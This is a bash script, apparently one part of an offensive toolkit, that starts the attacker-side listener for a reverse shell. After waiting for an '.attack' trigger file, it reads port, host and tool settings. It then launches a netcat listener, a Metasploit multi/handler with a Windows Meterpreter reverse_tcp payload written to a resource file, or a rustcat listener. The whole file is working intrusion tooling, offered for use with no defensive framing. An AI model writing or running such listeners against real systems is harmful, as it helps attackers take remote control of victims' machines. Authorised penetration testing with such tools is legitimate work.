#!/usr/bin/env bash

LBlue='\033[0;94m'      # Ligth Blue
BRed='\033[1;31m'       # Bold Red
BBlue='\033[1;34m'      # Bold Blue
BWhite='\033[1;37m'     # Bold White
Color_Off='\033[0m'     # Text Reset

tput civis

while [[ ! -f .attack ]];do
    clear
    echo -e " ${LBlue}[${BBlue}+${LBlue}] ${BWhite}Setting up Reverse Shell...${Color_Off}\n"
    sleep 5
done

tput cnorm

# Personalizar puerto
PORT=$(cat port.txt)
#PORT=${1:-5040} # Puerto por defecto: 5040
TOOL=$(cat tool.txt)
HOST=$(cat host.txt)

if [[ "$TOOL" == "netcat" ]]; then
    # Iniciar nc con verificación
    rlwrap -cAr nc -nlvp "$PORT" || {
        echo -e " ${LBlue}[${BRed}✘${LBlue}] ${BWhite}Error starting nc${Color_Off}"
        exit 1
    }
elif [[ "$TOOL" == "meterpreter" ]]; then
    # Creando configuraciones para msfconsole en un archivo
    echo -e "use exploit/multi/handler\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST $HOST\nset LPORT $PORT\nexploit" > listener.rc
    # Iniciar msfconsole con verificación
    msfconsole -r listener.rc || {
        echo -e " ${LBlue}[${BRed}✘${LBlue}] ${BWhite}Error starting msfconsole${Color_Off}"
        exit 1
    }
elif [[ "$TOOL" == "rustcat" ]]; then
    # Iniciar rustcat con verificación
    rcat listen -l "$PORT" || {
        echo -e " ${LBlue}[${BRed}✘${LBlue}] ${BWhite}Error starting rustcat${Color_Off}"
        exit 1
    }
else
    echo -e " ${LBlue}[${BRed}✘${LBlue}] ${BWhite}Error starting Reverse Shell${Color_Off}"
    exit 1
fi